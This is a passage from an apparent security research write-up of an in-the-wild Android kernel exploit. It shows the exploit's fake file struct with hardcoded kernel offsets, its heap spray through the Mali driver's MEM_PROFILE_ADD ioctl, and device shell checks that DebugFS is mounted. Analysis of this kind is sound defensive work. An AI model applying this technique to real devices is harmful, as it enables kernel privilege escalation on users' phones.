 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.a0f322910268bcdf319b3b8a5c5329726f92499f"></a><a id="t.21"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">fake_file</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">f_u </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0x1010101</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">fake_file</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">f_op </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;kaddr </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0x2071B0</span><span class="vdnyYxSRCi-c0">+</span><span class="vdnyYxSRCi-c13">0x1094E80</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">fake_file</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">f_count </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0x7F</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">fake_file</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">private_data </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c4">addr_limit_ptr</span><span class="vdnyYxSRCi-c0">;</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The </span><span class="vdnyYxSRCi-c2">f_op</span><span>&nbsp;member is set to the </span><span class="vdnyYxSRCi-c2">signalfd_op</span><span>&nbsp;for reasons we</span><span>&nbsp;will cover below in the &ldquo;Overwriting the addr_limit&rdquo; section. </span><span class="vdnyYxSRCi-c2">kaddr</span><span>&nbsp;is the address leaked using vulnerability #2 described previously. The </span><span class="vdnyYxSRCi-c2">addr_limit_ptr</span><span>&nbsp;was calculated by adding 8 to the </span><span class="vdnyYxSRCi-c2">task_struct</span><span class="vdnyYxSRCi-c7">&nbsp;address also leaked using vulnerability #2.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit sprays 25 of these structs across the </span><span>heap</span><span>&nbsp;using the </span><span class="vdnyYxSRCi-c2">MEM_PROFILE_ADD</span><span class="vdnyYxSRCi-c7">&nbsp;ioctl in the Mali driver. </span></p><a id="t.f09c2146baf213427f9b780c78be6f03204fa8b6"></a><a id="t.22"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">/**</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* struct kbase_ioctl_mem_profile_add - Provide profiling information to kernel</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @buffer: Pointer to the information</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @len: Length</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @padding: Padding</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;*</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* The data provided is accessible through a debugfs file</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_ioctl_mem_profile_add </span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; __u64 buffer</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; __u32 len</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; __u32 padding</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#define</span><span class="vdnyYxSRCi-c4">&nbsp;KBASE_ioctl_MEM_PROFILE_ADD </span><span class="vdnyYxSRCi-c0">\</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; _IOW</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">KBASE_ioctl_TYPE</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">27</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_ioctl_mem_profile_add</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">static</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_api_mem_profile_add</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_context </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_ioctl_mem_profile_add </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">buf</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;err</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">len </span><span class="vdnyYxSRCi-c0">&gt;</span><span class="vdnyYxSRCi-c4">&nbsp;KBASE_MEM_PROFILE_MAX_BUF_SIZE</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dev_err</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">kbdev</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">dev</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;mem_profile_add: buffer too big\n&quot;</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EINVAL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; buf </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;kmalloc</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">len</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;GFP_KERNEL</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">ZERO_OR_NULL_PTR</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">buf</span><span class="vdnyYxSRCi-c0">))</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">ENOMEM</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; err </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;copy_from_user</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">buf</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;u64_to_user_ptr</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">buffer</span><span class="vdnyYxSRCi-c0">),</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">len</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">err</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">buf</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EFAULT</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;kbasep_mem_profile_debugfs_insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;buf</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">len</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>This ioctl takes a pointer to a buffer, the length of the buffer, and padding as arguments. </span><span class="vdnyYxSRCi-c2">kbase_api_mem_profile_add</span><span class="vdnyYxSRCi-c7">&nbsp;will allocate a buffer on the kernel heap and then will copy the passed buffer from userspace into the newly allocated kernel buffer.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Finally, </span><span class="vdnyYxSRCi-c2">kbase_api_mem_profile_add</span><span>&nbsp;calls </span><span class="vdnyYxSRCi-c2">kbasep_mem_profile_debugfs_insert</span><span>. This technique only works when the device is running a kernel with </span><span class="vdnyYxSRCi-c2">CONFIG_DEBUG_FS</span><span>&nbsp;enabled. The purpose of the </span><span class="vdnyYxSRCi-c2">MEM_PROFILE_ADD</span><span>&nbsp;ioctl is to write a buffer to DebugFS. As of Android 11, DebugFS should not be enabled on production devices. </span><span>Whenever Android launches new requirements like this, it only applies to devices launched on that new version of Android. Android 11 launched in September 2020 and the exploit was found in November 2020 so it makes sense that the exploit targeted devices Android 10 and before where DebugFS would have been mounted.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/s903/image4.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/s903/image4.png" border="0" alt="Screenshot of the DebugFS section from https://source.android.com/docs/setup/about/android-11-release#debugfs. &nbsp;The highlighted text reads: &amp;quot;Android 11 removes platform support for DebugFS and requires that it not be mounted or accessed on production devices&amp;quot;" style="max-height: 750px; max-width: 600px;"title="Screenshot of the DebugFS section from https://source.android.com/docs/setup/about/android-11-release#debugfs. &nbsp;The highlighted text reads: &amp;quot;Android 11 removes platform support for DebugFS and requires that it not be mounted or accessed on production devices&amp;quot;" /></a></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>For example, on the A51 exynos device (SM-A515F) which launched on Android 10, both </span><span class="vdnyYxSRCi-c2">CONFIG_DEBUG_FS</span><span class="vdnyYxSRCi-c7">&nbsp;is enabled and DebugFS is mounted. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.7ecb17c683a1281f47d4612e785891bb86b4709f"></a><a id="t.23"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">a51</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c18">/ $ getprop ro.build.fingerprint</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c18">samsung/</span><span class="vdnyYxSRCi-c4">a51nnxx</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">a51</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c13">11</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">RP1A</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c13">200720.012</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">A515FXXU4DUB1</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">user</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">release</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c3">keys</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">a51</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c18">/ $ getprop ro.build.version.security_patch</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c18">2021-02-01</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c18">a51:/</span><span class="vdnyYxSRCi-c4">&nbsp;$ uname </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c3">a</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c12">Linux</span><span class="vdnyYxSRCi-c4">&nbsp;localhost </span><span class="vdnyYxSRCi-c13">4.14</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c13">113</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c13">20899478</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c20">#1 SMP PREEMPT Mon Feb 1 15:37:03 KST 2021 aarch64</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">a51</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c18">/ $ cat /</span><span class="vdnyYxSRCi-c4">proc</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">config</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">gz </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c4">&nbsp;gunzip </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c4">&nbsp;cat </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c3">&nbsp;grep CONFIG_DEBUG_FS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">CONFIG_DEBUG_FS</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">=</span><span class="vdnyYxSRCi-c3 vdnyYxSRCi-c9">y</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">a51</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c18">/ $ cat /</span><span class="vdnyYxSRCi-c4">proc</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">mounts </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c3">&nbsp;grep debug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">/</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">sys</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">/</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">kernel</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">/</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">debug </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">/</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">sys</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">/</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">kernel</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">/</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">debug debugfs rw</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">seclabel</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">relatime </span><span class="vdnyYxSRCi-c13 vdnyYxSRCi-c9">0</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c13 vdnyYxSRCi-c9">0</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Because DebugFS is mounted, the exploit is able to use the </span><span class="vdnyYxSRCi-c2">MEM_PROFILE_ADD</span><span>&nbsp;ioctl </span><span>to </span><span>groom the heap. </span><span>If DebugFS wasn&rsquo;t enabled or mounted, </span><span class="vdnyYxSRCi-c2">kbasep_mem_profile_debugfs_insert</span><span>&nbsp;would simply free the newly allocated kernel buffer and return.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.b54890eb264f51ceef4db4a7d94fde1a7369f3a7"></a><a id="t.24"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#ifdef</span><span class="vdnyYxSRCi-c3">&nbsp;CONFIG_DEBUG_FS</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;kbasep_mem_profile_debugfs_insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_context </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size_t size</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;err </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; mutex_lock</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">mem_profile_lock</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; dev_dbg</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">kbdev</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">dev</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;initialised: %d&quot;</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kbase_ctx_flag</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;KCTX_MEM_PROFILE_INITIALIZED</span><span class="vdnyYxSRCi-c0">));</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
